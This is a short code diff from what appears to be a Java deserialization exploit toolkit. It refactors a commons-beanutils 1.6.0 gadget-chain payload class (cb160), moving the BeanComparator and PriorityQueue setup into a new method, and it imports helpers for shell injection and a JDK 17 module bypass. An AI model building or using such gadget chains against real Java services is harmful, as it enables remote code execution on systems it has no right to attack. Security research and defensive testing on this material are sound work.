@@ -12,7 +12,7 @@ import java.util.PriorityQueue;
 import static com.qi4l.JYso.gadgets.utils.InjShell.insertField;
 import static com.qi4l.JYso.gadgets.utils.jdk17Bypass.patchModule;
 
-@SuppressWarnings("rawtypes")
+@SuppressWarnings({"rawtypes", "unchecked","unused"})
 @Dependencies({"commons-beanutils:commons-beanutils:1.6.0"})
 public class cb160 implements ObjectPayload<Object> {
 
@@ -23,8 +23,10 @@ public class cb160 implements ObjectPayload<Object> {
         ClassPool pool = ClassPool.getDefault();
         CtClass ctClass = pool.get("org.apache.commons.beanutils.BeanComparator");
         insertField(ctClass, "serialVersionUID", "private static final long serialVersionUID = 2573799559215537819;");
+        return getCbSink_1(ctClass,template);
+    }
 
-
+    public static Object getCbSink_1(CtClass ctClass, Object template) throws Exception {
         Class<?> beanCompareClazz = ctClass.toClass();
         BeanComparator comparator = (BeanComparator) beanCompareClazz.newInstance();
         final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
